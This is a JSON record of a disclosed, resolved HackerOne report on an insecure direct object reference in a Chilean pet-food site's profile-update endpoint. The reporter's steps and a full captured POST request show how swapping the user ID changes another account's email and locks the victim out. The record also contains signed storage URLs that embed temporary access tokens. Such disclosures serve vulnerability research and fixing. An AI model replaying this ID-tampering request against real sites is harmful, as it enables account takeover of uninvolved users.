@@ -1,0 +1,157 @@
+{
+  "id": 1952771,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTUyNzcx",
+  "url": "https://hackerone.com/reports/1952771",
+  "title": "████ ' can change any account email and cannot retrieve his account and access it ' at ███",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-04-18T16:46:58.466Z",
+  "submitted_at": "2023-04-18T16:46:58.558Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xs4m",
+    "url": "/0xs4m",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qvnxa9vj9ewh82ayeux1fy2z4ubb/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50581,
+    "url": "https://hackerone.com/mars",
+    "handle": "mars",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/Ec9VTTzrRe3u3WK8g4EqRrrP/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/Ec9VTTzrRe3u3WK8g4EqRrrP/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mars",
+      "twitter_handle": "",
+      "website": "http://mars.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-06-23T14:54:18.014Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-04-28T12:05:05.150Z",
+  "team_member_agreed_on_going_public_at": "2023-06-23T14:54:17.713Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "hi ███\ni found ██████████ , i can change any account email and he cannot retrieve his account and access it easily.\n\ni can't access to his account because url activation on new email don't work and give me error.\n\n```\nSyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\n```\nbut hackers will be able to disable access users to their account on the site.\n\n  1. Go to registration page (████)\n  2. Verified your account.\n  3. Go to login page and login your account.\n\n\n For the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created) \n\n   * For Attacker\n\n███████████\nPassword\n███████████ : ███████\n\n   * For Victim 1\n\n████████████\nPassword\n████ : ██████████\n\n   * For Victim 2\n\n██████████████\nPassword\n█████████ : ████ For Victim 3\n\n████\nPassword\n██████████\n\ni access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).\n\nso .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.\n\ni received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation\n```\nSyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\n```\nthe change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.\n\ni created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.\n\nburp request\n```\nPOST /_post/usuario_actualizar.php HTTP/1.1\nHost: ████████\nCookie: ████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/██████ Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: ████████\nContent-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594\nContent-Length: 2851\nOrigin: ███████-Insecure-Requests: 1\nSec-Fetch-Dest: iframe\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n-----------------------------297392175112058█████████████7932062474594\nContent-Disposition: form-data; name=\"nombre\"\n\nattacker\n-----------------------------297392175112058████7932062474594\nContent-Disposition: form-data; name=\"apellido\"\n\nattacker\n-----------------------------297392175112058███████7932062474594\nContent-Disposition: form-data; name=\"email\"\n\n████████████\n-----------------------------297392175112058███████7932062474594\nContent-Disposition: form-data; name=\"rut\"\n\n\n-----------------------------297392175112058███7932062474594\nContent-Disposition: form-data; name=\"idProvincia\"\n\n0\n-----------------------------297392175112058███7932062474594\nContent-Disposition: form-data; name=\"idLocalidad\"\n\n0\n-----------------------------297392175112058███████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n\nno\n-----------------------------297392175112058███████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n\nsi\n-----------------------------297392175112058████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n\nno\n-----------------------------297392175112058██████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n\nsi\n-----------------------------297392175112058████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n\nno\n-----------------------------297392175112058██████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n\nsi\n-----------------------------297392175112058███████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n\nno\n-----------------------------297392175112058██████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n\nsi\n-----------------------------297392175112058████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n\nno\n-----------------------------297392175112058███████████7932062474594\nContent-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n\nsi\n-----------------------------297392175112058██████████████7932062474594\nContent-Disposition: form-data; name=\"switch_pass\"\n\noff\n-----------------------------297392175112058███7932062474594\nContent-Disposition: form-data; name=\"ck_oldpass\"\n\nPassword\n-----------------------------297392175112058███████7932062474594\nContent-Disposition: form-data; name=\"oldpass\"\n\n\n-----------------------------297392175112058████████████7932062474594\nContent-Disposition: form-data; name=\"clave\"\n\n\n-----------------------------297392175112058█████████████7932062474594\nContent-Disposition: form-data; name=\"clave2\"\n\n\n-----------------------------297392175112058███████████7932062474594\nContent-Disposition: form-data; name=\"█████\"\n\n88796\n-----------------------------297392175112058████████7932062474594--\n```\n██████\n\n## Impact\n\n█████████████",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 30,
+  "voters": [
+    "weedseed",
+    "zy9ard3",
+    "0xoroot",
+    "nayeems3c",
+    "shreyaschavhan",
+    "shubham_srt",
+    "0xs4m",
+    "mr-inspector",
+    "haoshokunoo",
+    "shivammusic",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 318337,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.miroyalcanin.cl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "id": 472005,
+      "category": "team",
+      "content": "An Insecure Direct Object Reference (IDOR) vulnerability was present in the user profile update functionality on the  ██████████ website. The vulnerability allows an authenticated attacker to modify the email associated with any user account by manipulating the ' ██████████ ' parameter in the POST request sent to the ' ██████████ ' endpoint. The attacker can leverage this vulnerability to potentially take control of victim accounts by changing the email and initiating a password reset.",
+      "updated_at": "2024-06-25T17:11:58.931Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1467580,
+        "username": "ideborah",
+        "name": "Deborah Ingram",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-01-11T15:26:55.497Z",
+        "url": "https://hackerone.com/ideborah",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vlqtahexr9xtej7w41uff3pi30h2/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%22R0e268b9cabd9612c20198b4457076e07.jpg%22%3B%20filename%2A%3DUTF-8%27%27R0e268b9cabd9612c20198b4457076e07.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T211454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=862eb3db9f81edf62149a3356dad8c396775316f12df6ee9a93c861cc6939165",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vlqtahexr9xtej7w41uff3pi30h2/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a?response-content-disposition=inline%3B%20filename%3D%22R0e268b9cabd9612c20198b4457076e07.jpg%22%3B%20filename%2A%3DUTF-8%27%27R0e268b9cabd9612c20198b4457076e07.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T211454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=29ea0a2e3f3ba21851628f69d981111b46c49ef7a9b9abbc4c3ea113e067bbf0",
+          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vlqtahexr9xtej7w41uff3pi30h2/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586?response-content-disposition=inline%3B%20filename%3D%22R0e268b9cabd9612c20198b4457076e07.jpg%22%3B%20filename%2A%3DUTF-8%27%27R0e268b9cabd9612c20198b4457076e07.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T211454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=08f607b4d0a5a9bfc905480274cdf5db876e5055cc1e301cb3c6d48d161a45ff"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
